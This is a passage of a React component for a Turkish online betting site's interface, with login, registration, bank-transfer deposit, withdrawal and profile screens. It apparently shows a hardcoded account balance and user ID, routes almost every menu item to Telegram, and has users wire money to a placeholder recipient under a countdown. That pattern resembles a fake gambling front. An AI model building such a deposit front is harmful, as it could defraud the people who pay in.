              <button className={`mtab ${loginMethod === 'phone' ? 'active' : ''}`} onClick={() => setLoginMethod('phone')}>📞 Telefon</button>
              <button className={`mtab ${loginMethod === 'email' ? 'active' : ''}`} onClick={() => setLoginMethod('email')}>✉ E-posta</button>
            </div>
            <form onSubmit={handleLogin} className="modal-body">
              {loginMethod === 'phone' ? (
                <div className="input-group phone-input-group">
                  <button
                    type="button"
                    className="country-code-btn"
                    onTouchEnd={(event) => handleCountryButtonPress(event, 'login')}
                    onClick={(event) => handleCountryButtonPress(event, 'login')}
                    aria-label="Ülke kodu seç"
                    data-testid="login-country-btn"
                  >
                    <span className="country-flag">{loginCountry.flag}</span>
                    <span className="selected-code">{loginCountry.code}</span>
                    <span className="country-chevron">⌄</span>
                  </button>
                  <input type="tel" placeholder="000 000 00 00" value={loginPhone} onChange={(e) => setLoginPhone(e.target.value)} required data-testid="login-phone-input" autoComplete="tel" />
                </div>
              ) : (
                <div className="input-group">
                  <span className="input-pre">✉</span>
                  <input type="email" placeholder="E-posta" value={loginEmail} onChange={(e) => setLoginEmail(e.target.value)} required data-testid="login-email-input" />
                </div>
              )}
              <div className="input-group">
                <span className="input-pre">🔒</span>
                <input type="password" placeholder="Şifre" value={loginPassword} onChange={(e) => setLoginPassword(e.target.value)} required autoComplete="current-password" data-testid="login-password-input" />
              </div>
              <a href="#" className="forgot-link">Şifrenizi mi unuttunuz?</a>
              <button type="submit" className="green-btn" data-testid="login-submit-btn">Giriş yap</button>
              <div className="or-divider">veya</div>
            </form>
            <div className="modal-footer">
              <p>Hesabınız yok mu?</p>
              <button onClick={() => { setShowLoginModal(false); setShowRegisterModal(true); }} className="link-action">Kaydol</button>
            </div>
          </div>
        </div>
      )}

      {/* Register Modal */}
      {showRegisterModal && (
        <div className="modal-overlay" onClick={() => setShowRegisterModal(false)}>
          <div className="modal-box auth-modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Kayıt</h2>
              <button onClick={() => setShowRegisterModal(false)} className="modal-x">✕</button>
            </div>
            <form onSubmit={handleRegister} className="modal-body">
              <select value={registerCurrency} onChange={(e) => setRegisterCurrency(e.target.value)} className="currency-select" data-testid="register-currency-select">
                <option value="TRY">TRY Türk Lirası</option>
                <option value="USD">USD Amerikan Doları</option>
                <option value="EUR">EUR Euro</option>
              </select>
              <div className="modal-tabs">
                <button type="button" className={`mtab ${registerMethod === 'phone' ? 'active' : ''}`} onClick={() => setRegisterMethod('phone')}>📞 Telefon</button>
                <button type="button" className={`mtab ${registerMethod === 'email' ? 'active' : ''}`} onClick={() => setRegisterMethod('email')}>✉ E-posta</button>
              </div>
              {registerMethod === 'phone' ? (
                <div className="input-group phone-input-group">
                  <button
                    type="button"
                    className="country-code-btn"
                    onTouchEnd={(event) => handleCountryButtonPress(event, 'register')}
                    onClick={(event) => handleCountryButtonPress(event, 'register')}
                    aria-label="Ülke kodu seç"
                    data-testid="register-country-btn"
                  >
                    <span className="country-flag">{registerCountry.flag}</span>
                    <span className="selected-code">{registerCountry.code}</span>
                    <span className="country-chevron">⌄</span>
                  </button>
                  <input type="tel" placeholder="000 000 00 00" value={registerPhone} onChange={(e) => setRegisterPhone(e.target.value)} required data-testid="register-phone-input" autoComplete="tel" />
                </div>
              ) : (
                <div className="input-group">
                  <span className="input-pre">✉</span>
                  <input type="email" placeholder="E-posta" value={registerEmail} onChange={(e) => setRegisterEmail(e.target.value)} required data-testid="register-email-input" />
                </div>
              )}
              <div className="input-group">
                <span className="input-pre">🔒</span>
                <input type="password" placeholder="Şifre" value={registerPassword} onChange={(e) => setRegisterPassword(e.target.value)} required minLength={8} autoComplete="new-password" data-testid="register-password-input" />
              </div>
              <p className="hint-text">En az 8 karakter</p>
              <a href="#" className="promo-code-link">Promosyon kodu ekleyin</a>
              <label className="check-row">
                <input type="checkbox" required />
                <span>"Kaydol"a tıklayarak <a href="#" className="terms-link">kullanıcı sözleşmesini</a> kabul ediyorum</span>
              </label>
              <button type="submit" className="green-btn" data-testid="register-submit-btn">Kaydol</button>
              <div className="or-divider">veya</div>
            </form>
            <div className="modal-footer">
              <p>Hesabınız var mı?</p>
              <button onClick={() => { setShowRegisterModal(false); setShowLoginModal(true); }} className="link-action">Giriş yap</button>
            </div>
          </div>
        </div>
      )}

      {/* Deposit Modal */}
      {showDepositModal && (
        <div className="modal-overlay" onClick={closeDeposit}>
          <div className="deposit-panel" onClick={(e) => e.stopPropagation()}>
            {/* Header */}
            <div className="dep-header">
              {depositStep === 2 && (
                <button onClick={() => setDepositStep(1)} className="dep-back">‹ Geri</button>
              )}
              {depositStep === 1 && <div></div>}
              <button onClick={closeDeposit} className="dep-close">✕</button>
            </div>

            {/* Bank header */}
            <div className="dep-bank-header">
              <div className="bank-logo">
                <svg className="w-8 h-8" fill="#1a3a5c" viewBox="0 0 24 24">
                  <path d="M3 21h18v-2H3v2zm0-4h18v-1H3v1zm1-3h4V8H4v6zm6 0h4V8h-4v6zm6 0h4V8h-4v6zM2 7l10-5 10 5v1H2V7z"/>
                </svg>
                <div className="bank-logo-text">
                  <span className="blt-top">Banka</span>
                  <span className="blt-bottom">Havalesi</span>
                </div>
              </div>
              <h3 className="dep-bank-title">Banka Havalesi</h3>
            </div>

            {/* Fiat / Kripto tabs */}
            <div className="dep-type-tabs">
              <button className="dep-type-tab active">
                <span className="dtt-icon green">$</span> Fiat
              </button>
              <button className="dep-type-tab">
                <span className="dtt-icon orange">B</span> Kripto
              </button>
            </div>

            {depositStep === 1 ? (
              /* Step 1: Name + Amount form */
              <div className="dep-form">
                <input
                  type="text"
                  placeholder="Adı"
                  value={depFirstName}
                  onChange={(e) => setDepFirstName(e.target.value)}
                  className="dep-input"
                  data-testid="dep-firstname"
                  required
                />
                <input
                  type="text"
                  placeholder="Soyadı"
                  value={depLastName}
                  onChange={(e) => setDepLastName(e.target.value)}
                  className="dep-input"
                  data-testid="dep-lastname"
                  required
                />
                <div className="dep-amount-box">
                  <div className="dep-amount-label">Tutar</div>
                  <div className="dep-amount-row">
                    <span className="dep-currency">₺</span>
                    <input
                      type="text"
                      value={depAmount}
                      onChange={(e) => setDepAmount(e.target.value)}
                      className="dep-amount-input"
                      placeholder="100.000"
                      data-testid="dep-amount"
                    />
                    <span className="dep-bonus-badge">Bonus: 70 FS</span>
                  </div>
                  <p className="dep-range">₺100 ile ₺100.000 arasında</p>
                </div>

                <div className="dep-quick-amounts">
                  <button onClick={() => setQuickAmount('300')} className="quick-amt">₺300</button>
                  <button onClick={() => setQuickAmount('1.000')} className="quick-amt">₺1.000</button>
                  <button onClick={() => setQuickAmount('5.000')} className="quick-amt">₺5.000</button>
                  <button onClick={() => setQuickAmount('10.000')} className="quick-amt">₺10.000</button>
                </div>

                <button onClick={handleDepositNext} className="green-btn full" data-testid="dep-submit-btn">
                  Para yatır
                </button>

                <div className="dep-instructions-toggle">
                  <span>ℹ️ Ayrıntılı talimatlar</span>
                </div>

                <div className="dep-bonus-section">
                  <div className="dep-bonus-header">
                    <h4>Yatırım bonusu</h4>
                    <span className="dep-bonussuz">Bonussuz</span>
                  </div>
                  <div className="dep-bonus-card">
                    <div className="dep-bonus-card-text">
                      <p className="dep-bonus-main">70 ücretsiz döndürme</p>
                      <p className="dep-bonus-sub">300TL tutarında para yükleyin ve bonus alın</p>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              /* Step 2: Bank info + confirm */
              <div className="dep-confirm">
                <p className="dep-warning">Tam tutarı kopyalayın, aksi takdirde transfer hesabınıza geçmez</p>

                <div className="dep-bank-info-card">
                  <h4 className="dep-bank-info-title">Banka bilgilerini kopyala</h4>

                  <div className="dep-info-row">
                    <div className="dep-info-icon gray">
                      <svg className="w-5 h-5" fill="white" viewBox="0 0 20 20">
                        <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zM18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z"/>
                      </svg>
                    </div>
                    <div className="dep-info-text">
                      <span className="dep-info-label">Alıcının kart numarası</span>
                      <span className="dep-info-value">TR000000000000000000000000</span>
                    </div>
                    <button onClick={() => copyToClipboard('TR000000000000000000000000')} className="dep-copy-btn" data-testid="copy-iban">
                      <svg className="w-5 h-5" fill="#999" viewBox="0 0 20 20">
                        <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z"/>
                        <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z"/>
                      </svg>
                    </button>
                  </div>

                  <div className="dep-info-row">
                    <div className="dep-info-icon dark">
                      <svg className="w-5 h-5" fill="white" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="dep-info-text">
                      <span className="dep-info-label">Alıcı</span>
                      <span className="dep-info-value">ALICI ADI</span>
                    </div>
                  </div>

                  <div className="dep-info-row">
                    <div className="dep-info-icon red">₺</div>
                    <div className="dep-info-text">
                      <span className="dep-info-label">Tutar</span>
                      <span className="dep-info-value">₺{depAmount || '0'}</span>
                    </div>
                    <button onClick={() => copyToClipboard(depAmount)} className="dep-copy-btn" data-testid="copy-amount">
                      <svg className="w-5 h-5" fill="#999" viewBox="0 0 20 20">
                        <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z"/>
                        <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                <div className="dep-countdown">
                  <span className="dep-countdown-icon">⏳</span>
                  <span>Transferi bekliyoruz:</span>
                  <span className="dep-countdown-time">{formatCountdown(countdown)}</span>
                </div>

                <button onClick={handleTransferConfirm} className="green-btn full" data-testid="transfer-confirm-btn">
                  Transferi onayla
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {showCountryPicker && (
        <div className="country-picker-overlay" onClick={() => setShowCountryPicker(false)}>
          <div className="country-picker-sheet" onClick={(e) => e.stopPropagation()}>
            <div className="country-picker-top">
              <h2>Ülke seçin</h2>
              <button type="button" onClick={() => setShowCountryPicker(false)} className="country-picker-close">×</button>
            </div>
            <div className="country-search-box">
              <span>⌕</span>
              <input value={countrySearch} onChange={(e) => setCountrySearch(e.target.value)} placeholder="Ara" autoFocus />
            </div>
            <div className="country-list">
              {filteredCountries.map((country) => {
                const selectedCountry = countryTarget === 'register' ? registerCountry : loginCountry;
                const isSelected = selectedCountry.code === country.code && selectedCountry.name === country.name;
                return (
                  <button type="button" key={`${country.code}-${country.name}`} className={`country-row ${isSelected ? 'selected' : ''}`} onClick={() => selectCountry(country)}>
                    <span className="country-row-flag">{country.flag}</span>
                    <span className="country-row-code">{country.code}</span>
                    <span className="country-row-name">{country.name}</span>
                  </button>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {showWithdrawModal && (
        <div className="modal-overlay" onClick={() => setShowWithdrawModal(false)}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Para çek</h2>
              <button onClick={() => setShowWithdrawModal(false)} className="modal-x">✕</button>
            </div>
            <form onSubmit={handleWithdrawSubmit} className="modal-body">
              <div className="input-group">
                <span className="input-pre">₺</span>
                <input
                  type="text"
                  placeholder="Çekilecek tutar"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  required
                  data-testid="withdraw-amount-input"
                />
              </div>
              <div className="input-group">
                <span className="input-pre">🏦</span>
                <input
                  type="text"
                  placeholder="IBAN / hesap bilgisi"
                  value={withdrawAccount}
                  onChange={(e) => setWithdrawAccount(e.target.value)}
                  required
                  data-testid="withdraw-account-input"
                />
              </div>
              <button type="submit" className="green-btn" data-testid="withdraw-submit-btn">Talep gönder</button>
            </form>
          </div>
        </div>
      )}

      {/* Social Modal */}
      {showSocialModal && (
        <div className="modal-overlay" onClick={() => setShowSocialModal(false)}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Sosyal Medya</h2>
              <button onClick={() => setShowSocialModal(false)} className="modal-x">✕</button>
            </div>
            <div className="social-list">
              {socialMediaItems.map((item, idx) => (
                <button key={idx} onClick={openTelegram} className="social-item" data-testid={`social-${item.name.toLowerCase()}`}>
                  <span className="social-icon">{item.icon}</span>
                  <span className="social-name">{item.name}</span>
                  <span className="social-arrow">›</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Profile Modal */}
      {showProfileModal && isLoggedIn && (
        <div className="modal-overlay" onClick={() => setShowProfileModal(false)}>
          <div className="profile-panel" onClick={(e) => e.stopPropagation()}>
            <div className="profile-top">
              <h2>Profil</h2>
              <button onClick={() => setShowProfileModal(false)} className="profile-close">✕</button>
            </div>

            <div className="profile-user-section">
              <h3 className="profile-username">{username}</h3>
              <p className="profile-id">ID 1923196</p>
            </div>

            <div className="profile-balance-card">
              <span className="pbc-label">Hesap</span>
              <span className="pbc-amount">₺45.821</span>
              <div className="pbc-buttons">
                <button onClick={() => { setShowProfileModal(false); openDeposit(); }} className="pbc-deposit" data-testid="profile-deposit-btn">
                  <span className="pbc-plus">+</span> Para yatır
                </button>
                <button onClick={openWithdraw} className="pbc-withdraw" data-testid="profile-withdraw-btn">
                  Para çek
                </button>
              </div>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🎁</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bonuslar</span>
                  <span className="pmi-desc">Ücretsiz döndürmeler ve diğer teklifler</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🏷️</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bonus code'ları</span>
                  <span className="pmi-desc">Kod etkinleştirme</span>
                </div>
              </button>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🕐</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bahis geçmişi</span>
                  <span className="pmi-desc">Açık ve sonuçlanmış bahisler</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">💳</span>
                <div className="pmi-text">
                  <span className="pmi-title">Ödeme geçmişi</span>
                  <span className="pmi-desc">Para yatırma ve çekme durumları</span>
                </div>
              </button>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">⚙️</span>
                <div className="pmi-text">
                  <span className="pmi-title">Ayarlar</span>
                  <span className="pmi-desc">Kişisel verileri düzenle</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🔄</span>
                <div className="pmi-text">
                  <span className="pmi-title">7/24 destek</span>
                  <span className="pmi-desc">Tüm iletişim bilgileri</span>
                </div>
              </button>
            </div>

            <button onClick={handleLogout} className="profile-logout" data-testid="logout-btn">Çıkış Yap</button>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
